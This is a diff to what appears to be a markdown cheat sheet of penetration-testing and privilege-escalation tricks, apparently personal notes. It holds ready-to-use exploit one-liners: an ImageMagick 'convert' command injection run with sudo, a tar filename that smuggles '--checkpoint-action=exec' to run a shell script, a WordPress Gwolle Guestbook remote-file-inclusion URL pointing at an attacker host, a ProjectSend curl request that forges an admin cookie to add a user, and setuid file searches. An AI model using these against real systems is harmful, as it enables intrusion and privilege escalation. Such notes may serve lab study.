@@ -394,15 +394,25 @@ or
 Using vulnerability in 'convert' to execute arbitrary commands with privelege:
 `> sudo convert 'https://";/bin/bash"' /dev/null`
 
-#### filename for tar execution vuln [sh]
+#### filename for tar execution vuln
 If you want to exucute code with a tar command (e.g. backup cronjob) , rename file to backup as follows:
 `'--checkpoint-action=exec=sh file.sh'`
 
 #### dirty cOw privilege escalation
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+
+#### word press gwolle guestbook plugin RFI xploit
+`http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`
+
+#### wordpress projectsend exploit
+- add an admin user to the database:
+`curl http://projectsend.local/users-add.php -H 'Cookie: userlevel=9' -X POST --data'add_user_form_name=necci&add_user_form_email=poplix@papuasia.org&add_user_form_level=9&add_user_form_user=necci&add_user_form_active=1&add_user_form_pass=123456'`
+
+#### exim4 priviledge escalation
 
 
 #### find files with setuid / setgid / r+w permissions
-`> find <directory> -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename`
+`> find / -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename`
 or
 `> find / -perm +4000 -user root -type f -print`
 
@@ -420,7 +430,6 @@ or
 `> uname -r`
 or
 `> cat /proc/version`
-
 
 -----
 
